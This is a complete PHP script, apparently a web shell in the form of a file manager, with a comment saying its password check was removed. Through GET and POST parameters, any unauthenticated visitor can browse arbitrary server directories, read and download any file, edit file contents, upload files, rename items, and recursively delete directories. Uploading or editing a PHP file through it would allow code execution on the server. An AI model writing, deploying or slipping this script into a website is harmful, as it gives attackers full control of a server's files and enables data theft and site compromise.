<?php
session_start();

// 🚫 Password check removed

$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$dir || !is_dir($dir)) die("❌ Invalid directory");

// 📝 Edit
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $file = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        echo "<div style='padding:10px;background:#e0ffe0;'>✅ Saved!</div>";
    }
    echo '<form method="POST" style="margin:10px;font-family:sans-serif;">
            <textarea name="content" style="width:100%;height:400px;padding:10px;">'.htmlspecialchars(file_get_contents($file)).'</textarea><br>
            <input type="submit" value="Save" style="margin-top:10px;padding:8px 16px;"/>
          </form>';
    exit;
}

// 📥 Download
if (isset($_GET['download']) && is_file($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Type: application/octet-stream');
    readfile($file);
    exit;
}

// 🔁 Rename
if (!empty($_POST['rename_old']) && !empty($_POST['rename_new'])) {
    $old = realpath($_POST['rename_old']);
    $newName = basename($_POST['rename_new']);
    $new = dirname($old) . '/' . $newName;
    if ($old && file_exists($old) && !file_exists($new)) {
        rename($old, $new);
        echo "<div style='padding:10px;background:#e0ffe0;'>✅ Renamed!</div>";
    } else {
        echo "<div style='padding:10px;background:#ffe0e0;'>❌ Rename failed</div>";
    }
}

// ❌ Delete (recursive for directories)
function deleteRecursive($path) {
    if (is_file($path) || is_link($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $items = array_diff(scandir($path), ['.', '..']);
        foreach ($items as $item) {
            deleteRecursive($path . '/' . $item);
        }
        return rmdir($path);
    }
    return false;
}

if (!empty($_POST['delete_path'])) {
    $target = realpath($_POST['delete_path']);
    if ($target && strpos($target, $dir) === 0) {
        if (deleteRecursive($target)) {
            echo "<div style='padding:10px;background:#e0ffe0;'>✅ Deleted</div>";
        } else {
            echo "<div style='padding:10px;background:#ffe0e0;'>❌ Delete failed</div>";
        }
    }
}

// ⬆️ Upload
if (!empty($_FILES['file']['name'])) {
    $name = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dir.'/'.$name)) {
        echo "<div style='padding:10px;background:#e0ffe0;'>✅ Uploaded!</div>";
    } else {
        echo "<div style='padding:10px;background:#ffe0e0;'>❌ Upload failed</div>";
    }
}

// ➕ Create File
if (!empty($_POST['new_file'])) {
    $newFile = $dir . '/' . basename($_POST['new_file']);
    if (!file_exists($newFile)) {
        file_put_contents($newFile, '');
        echo "<div style='padding:10px;background:#e0ffe0;'>✅ File created</div>";
    } else {
        echo "<div style='padding:10px;background:#ffe0e0;'>❌ File exists</div>";
    }
}

// ➕ Create Directory
if (!empty($_POST['new_dir'])) {
    $newDir = $dir . '/' . basename($_POST['new_dir']);
    if (!file_exists($newDir)) {
        mkdir($newDir);
        echo "<div style='padding:10px;background:#e0ffe0;'>✅ Directory created</div>";
    } else {
        echo "<div style='padding:10px;background:#ffe0e0;'>❌ Directory exists</div>";
    }
}

// 📂 UI
echo "<div style='font-family:sans-serif;padding:10px;'>";
echo "<h2>📂 Directory: $dir</h2>";

echo '<form method="POST" enctype="multipart/form-data" style="margin-bottom:10px;">
        <input type="file" name="file" style="padding:4px;"/>
        <input type="submit" value="Upload" style="padding:6px 12px;"/>
      </form>';

echo '<form method="POST" style="margin-bottom:10px;">
        <input type="text" name="new_file" placeholder="New file name" style="padding:4px;"/>
        <input type="submit" value="Create File" style="padding:6px 12px;"/>
      </form>';

echo '<form method="POST" style="margin-bottom:20px;">
        <input type="text" name="new_dir" placeholder="New directory name" style="padding:4px;"/>
        <input type="submit" value="Create Directory" style="padding:6px 12px;"/>
      </form>';

$files = scandir($dir);
echo "<table style='width:100%;border-collapse:collapse;font-size:14px;'>";
foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = $dir . '/' . $f;
    $safePath = htmlspecialchars($path);
    $safeName = htmlspecialchars($f);

    echo "<tr style='border-bottom:1px solid #ddd;'>";
    echo "<td style='padding:6px;'>".(is_dir($path) ? "📁" : "📄")."</td>";
    echo "<td style='padding:6px;'><a href='?dir=" . urlencode(is_dir($path) ? $path : $dir) . "'>$safeName</a></td>";

    // Rename
    echo "<td style='padding:6px;'>
            <form method='POST' style='display:inline;'>
                <input type='hidden' name='rename_old' value='$safePath'/>
                <input type='text' name='rename_new' value='$safeName' style='width:100px;padding:2px;'/>
                <input type='submit' value='Rename' style='padding:2px 6px;'/>
            </form>
          </td>";

    // Edit / Download / Delete
    echo "<td style='padding:6px;'>";
    if (is_file($path)) {
        echo "<a href='?edit=" . urlencode($path) . "'>✏️ Edit</a> |
              <a href='?download=" . urlencode($path) . "'>⬇️ Download</a> | ";
    }
    echo "<form method='POST' style='display:inline;' onsubmit='return confirm(\"Are you sure?\")'>
            <input type='hidden' name='delete_path' value='$safePath'/>
            <input type='submit' value='🗑️ Delete' style='padding:2px 6px;'/>
          </form>";
    echo "</td>";
    echo "</tr>";
}
echo "</table></div>";
?>
